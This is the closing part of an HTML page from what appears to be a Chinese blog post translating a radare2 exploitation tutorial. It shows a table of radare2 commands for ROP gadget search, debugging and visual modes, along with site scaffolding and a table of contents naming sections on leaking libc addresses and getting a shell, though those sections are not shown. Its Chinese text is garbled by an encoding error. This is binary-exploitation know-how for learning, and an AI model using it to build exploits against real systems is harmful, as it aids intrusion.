<li><code>/R/</code>â€”â€”ROPå¸¸è§„æœç´¢</li>
</ul>
<h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><ul>
<li><code>dc</code>â€”â€”ç»§ç»­æ‰§è¡Œ</li>
<li><code>dcu addr</code>â€”â€”ç»§ç»­æ‰§è¡Œåˆ°æŸä¸ªåœ°å€</li>
<li><code>dcr</code>â€”â€”ç»§ç»­æ‰§è¡Œç›´åˆ°<code>ret</code>ï¼ˆå•æ­¥æ­¥è¿‡ï¼‰</li>
<li><code>dbt [?]</code>â€”â€”åœ¨<em>dbg.btdepth</em>å’Œ<em>dbg.btalgo</em>çš„åŸºç¡€ä¸Šå›æº¯æŒ‡ä»¤</li>
<li><code>doo [args]</code>â€”â€”é‡æ–°æ‰“å¼€è°ƒè¯•å¹¶è®¾ç½®å‚æ•°</li>
<li><code>ds</code>â€”â€”å•æ­¥æ­¥å…¥</li>
<li><code>dso</code>â€”â€”å•æ­¥æ­¥è¿‡</li>
</ul>
<h2 id="å›¾å½¢æ¨¡å¼"><a href="#å›¾å½¢æ¨¡å¼" class="headerlink" title="å›¾å½¢æ¨¡å¼"></a>å›¾å½¢æ¨¡å¼</h2><ul>
<li><code>pdf @ addr</code>â€”â€”è¾“å‡ºå½“å‰ä½ç§»ä¸‹å‡½æ•°çš„æ±‡ç¼–ä»£ç </li>
<li><code>V</code>â€”â€”å¯è§†åŒ–æ¨¡å¼ï¼Œä½¿ç”¨<code>p</code>/<code>P</code>å†ä¸¤ä¸ªæ¨¡å¼é—´åˆ‡æ¢</li>
<li><code>VV</code>â€”â€”å›¾å½¢æ¨¡å¼ï¼Œåœ¨asciiå›¾åƒä¸‹åˆ†æ</li>
<li><code>V!</code>â€”â€”æ§åˆ¶æ¿æ¨¡å¼ï¼Œå¯¹æ¼æ´åˆ©ç”¨éå¸¸æœ‰ç”¨</li>
</ul>
<p>çœ‹çœ‹<a href="http://radare.today/posts/using-radare2/" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a>ï¼Œä¹Ÿè®¸æœ‰æ›´å¤šçš„å†…å®¹èƒ½å¤Ÿå¸®åŠ©åˆ°ä½ ã€‚</p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/re/">re</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/translation/">translation</a></li></ul>

      
        
	<div id="comment">
		<!-- æ¥å¿…åŠ›Cityç‰ˆå®‰è£…ä»£ç  -->
		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
		<script type="text/javascript">
		   (function(d, s) {
		       var j, e = d.getElementsByTagName(s)[0];

		       if (typeof LivereTower === 'function') { return; }

		       j = d.createElement(s);
		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
		       j.async = true;

		       e.parentNode.insertBefore(j, e);
		   })(document, 'script');
		</script>
		<noscript>ä¸ºæ­£å¸¸ä½¿ç”¨æ¥å¿…åŠ›è¯„è®ºåŠŸèƒ½è¯·æ¿€æ´»JavaScript</noscript>
		</div>
		<!-- Cityç‰ˆå®‰è£…ä»£ç å·²å®Œæˆ -->
	</div>



      
    </footer>
    <hr class="entry-footer-hr">
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/02/28/ã€è½¬ã€‘æ€æ ·å†™ä¸€ä¸ªè§£é‡Šå™¨/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          ã€è½¬ã€‘æ€æ ·å†™ä¸€ä¸ªè§£é‡Šå™¨
        
      </div>
    </a>
  
  
    <a href="/2019/02/21/2019-å¾çˆ±ç ´è§£è§£é¢˜é¢†çº¢åŒ…æ´»åŠ¨-writeup/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">2019-å¾çˆ±ç ´è§£è§£é¢˜é¢†çº¢åŒ…æ´»åŠ¨-writeup</div>
    </a>
  
</nav>

  
</article>

<!-- Table of Contents -->

  <aside id="sidebar">
    <div id="toc" class="toc-article">
    <strong class="toc-title">Contents</strong>
    
      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#åºè¨€"><span class="nav-number">1.</span> <span class="nav-text">åºè¨€</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#æ›´æ–°radare2"><span class="nav-number">2.</span> <span class="nav-text">æ›´æ–°radare2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ç†Ÿæ‚‰ç¨‹åº"><span class="nav-number">3.</span> <span class="nav-text">ç†Ÿæ‚‰ç¨‹åº</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ç†è§£æ¼æ´"><span class="nav-number">4.</span> <span class="nav-text">ç†è§£æ¼æ´</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#è§„åˆ’æ¼æ´åˆ©ç”¨è„šæœ¬"><span class="nav-number">5.</span> <span class="nav-text">è§„åˆ’æ¼æ´åˆ©ç”¨è„šæœ¬</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ç¼–å†™æ¼æ´åˆ©ç”¨è„šæœ¬"><span class="nav-number">6.</span> <span class="nav-text">ç¼–å†™æ¼æ´åˆ©ç”¨è„šæœ¬</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#è®¡åˆ’"><span class="nav-number">6.1.</span> <span class="nav-text">è®¡åˆ’</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#æ³„æ¼putsçš„åœ°å€"><span class="nav-number">6.2.</span> <span class="nav-text">æ³„æ¼putsçš„åœ°å€</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#è®¡ç®—çœŸå®åœ°å€"><span class="nav-number">6.3.</span> <span class="nav-text">è®¡ç®—çœŸå®åœ°å€</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#è·å–shell"><span class="nav-number">6.4.</span> <span class="nav-text">è·å–shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#åè®°"><span class="nav-number">7.</span> <span class="nav-text">åè®°</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#æ¼æ´åˆ©ç”¨å‘½ä»¤å¯¹åº”è¡¨"><span class="nav-number">8.</span> <span class="nav-text">æ¼æ´åˆ©ç”¨å‘½ä»¤å¯¹åº”è¡¨</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#è·å–ä¿¡æ¯"><span class="nav-number">8.1.</span> <span class="nav-text">è·å–ä¿¡æ¯</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#å†…å­˜"><span class="nav-number">8.2.</span> <span class="nav-text">å†…å­˜</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#æŸ¥æ‰¾"><span class="nav-number">8.3.</span> <span class="nav-text">æŸ¥æ‰¾</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#è°ƒè¯•"><span class="nav-number">8.4.</span> <span class="nav-text">è°ƒè¯•</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#å›¾å½¢æ¨¡å¼"><span class="nav-number">8.5.</span> <span class="nav-text">å›¾å½¢æ¨¡å¼</span></a></li></ol></li></ol>
    
    </div>
  </aside>
</section>
        
      </div>

    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/tags" class="mobile-nav-link">Tags</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    <footer id="footer" class="site-footer">
  

  <div class="clearfix container">
      <div class="site-info">
	      &copy; 2019 AssassinQ All Rights Reserved.
        
      </div>
      <div class="site-credit">
        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
      </div>
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");

    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";


    <!-- headerblur min height -->
    
      var headerblur = document.getElementById("header-blur");
      headerblur.style.minHeight = window.getComputedStyle(document.getElementById("allheader"), null).height;
    
    
</script>
    
<div style="display: none;">
  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
</div>

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>
<script src="/js/bootstrap.js"></script>
<script src="/js/main.js"></script>







  <div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
  </div>








  </div>

  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js" async=""></script>
</body>
</html>
